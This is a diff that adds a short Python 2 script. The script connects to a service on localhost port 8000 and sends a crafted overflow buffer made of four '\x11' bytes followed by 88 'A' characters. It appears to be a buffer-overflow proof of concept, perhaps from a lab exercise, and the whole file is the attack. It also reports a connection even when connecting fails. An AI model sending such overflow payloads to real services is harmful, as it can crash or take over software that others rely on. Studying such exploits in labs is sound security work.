@@ -1,0 +1,27 @@
+#!/usr/bin/python
+# Reference: http://www.binarytides.com/code-telnet-client-sockets-python/
+import socket, select, string, sys
+
+def main():
+
+    host = 'localhost'
+    port = 8000
+    message =  '\x11\x11\x11\x11' + 'A' * 88
+    
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(3)
+
+    try:
+        s.connect((host, port))
+    except:
+        print 'Unable to connect'
+
+    print 'Connected to remote host'
+
+    s.send(message)
+    print 'Message sent'
+
+    s.close()
+
+if __name__ == '__main__':
+    main()
